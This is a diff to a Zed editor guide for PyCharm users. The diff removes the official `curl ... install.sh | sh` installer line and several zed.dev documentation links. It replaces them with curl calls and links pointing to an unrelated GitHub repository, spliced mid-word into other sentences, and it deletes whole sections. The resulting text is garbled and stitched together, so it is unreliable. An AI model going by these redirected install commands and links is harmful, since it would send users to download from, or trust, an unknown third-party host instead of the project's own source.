@@ -26,16 +26,7 @@ winget install Zed.Zed
 For most Linux users, the easiest way to install Zed is through our installation script:
 
 ```sh
-curl -f https://zed.dev/install.sh | sh
-```
-
-After installation, you can launch Zed from your Applications folder (macOS), Start menu (Windows), or directly from the terminal using:
-`zed .`
-This opens the current directory in Zed.
-
-## Set Up the JetBrains Keymap
-
-If you're coming from PyCharm, the fastest way to feel at home is to use the JetBrains keymap. During onboarding, you can select it as your base keymap. If you missed that step, you can change it anytime:
+curl -f https://github.com/Banshal-Yadav/nir're coming from PyCharm, the fastest way to feel at home is to use the JetBrains keymap. During onboarding, you can select it as your base keymap. If you missed that step, you can change it anytime:
 
 1. Open Settings with `Cmd+,` (macOS) or `Ctrl+,` (Linux/Windows)
 2. Search for `Base Keymap`
@@ -346,10 +337,7 @@ To set expectations clearly, here's what PyCharm offers that Zed doesn't have:
 PyCharm offers Code With Me as a separate plugin for collaboration. Zed has collaboration built into the core experience.
 
 - Open the Collab Panel in the left dock
-- Create a channel and [invite your collaborators](https://zed.dev/docs/collaboration#inviting-a-collaborator) to join
-- [Share your screen or your codebase](https://zed.dev/docs/collaboration#share-a-project) directly
-
-Once connected, you'll see each other's cursors, selections, and edits in real time. Voice chat is included. There's no need for separate tools or third-party logins.
+- Create a channel and [invite your collaborators](https://github.com/Banshal-Yadav/nir/wiki'll see each other's cursors, selections, and edits in real time. Voice chat is included. There's no need for separate tools or third-party logins.
 
 ## Using AI in Zed
 
@@ -368,20 +356,7 @@ Once signed in, just start typing. Zed will offer suggestions inline for you to 
 
 To use other AI models in Zed, you have several options:
 
-- Use Zed's hosted models, with higher rate limits. Requires [authentication](https://zed.dev/docs/authentication) and subscription to [Zed Pro](https://zed.dev/docs/ai/subscription.html).
-- Bring your own [API keys](https://zed.dev/docs/ai/llm-providers.html), no authentication needed
-- Use [external agents like Claude Agent](https://zed.dev/docs/ai/external-agents.html)
-
-## Advanced Config and Productivity Tweaks
-
-Zed exposes advanced settings for power users who want to fine-tune their environment.
-
-Here are a few useful tweaks:
-
-**Format on Save:**
-
-```json
-"format_on_save": "on"
+- Use Zed's hosted models, with higher rate limits. Requires [authentication](https://github.com/Banshal-Yadav/nir/wiki"format_on_save": "on"
 ```
 
 **Enable direnv support (useful for Python projects using direnv):**
